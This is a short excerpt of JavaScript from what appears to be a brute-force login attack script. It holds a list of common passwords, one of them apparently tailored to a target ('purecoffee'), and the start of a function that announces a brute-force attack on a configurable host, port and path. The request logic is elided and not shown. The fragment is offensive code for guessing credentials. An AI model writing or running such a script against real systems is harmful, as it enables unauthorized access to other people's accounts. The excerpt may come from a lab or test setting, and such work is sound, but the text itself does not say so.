...
const passwords = [
    "123456", "password", "admin", "welcome", "qwerty", "login",
    "hunter2", "coffee", "purecoffee", "master", "access"
];
...
async function runBruteForce() {
    console.log(`[☠️] STARTING BRUTE FORCE ATTACK on http://${TARGET_HOST}:${TARGET_PORT}${TARGET_PATH}`);
